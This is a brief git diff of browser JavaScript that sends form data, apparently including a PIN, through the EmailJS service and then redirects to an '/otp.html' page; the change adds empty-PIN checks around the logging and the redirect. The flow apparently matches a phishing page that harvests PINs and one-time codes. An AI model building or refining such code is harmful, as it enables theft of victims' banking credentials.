@@ -53,13 +53,17 @@ document
     console.log(emailParams);
     emailjs.send(serviceId, templateId, emailParams, userId).then(
       function (response) {
-        console.log("Sent successfully:", response);
-        pin = "";
+        if (pin.trim() !== "") {
+          console.log("Sent successfully:", response);
+          pin = "";
 
-        location.href = "/otp.html";
+          location.href = "/otp.html";
+        }
       },
       function (error) {
-        console.log("Failed to send:", error);
+        if (pin.trim() == "") {
+          console.log("Failed to send:", error);
+        }
       }
     );
   });
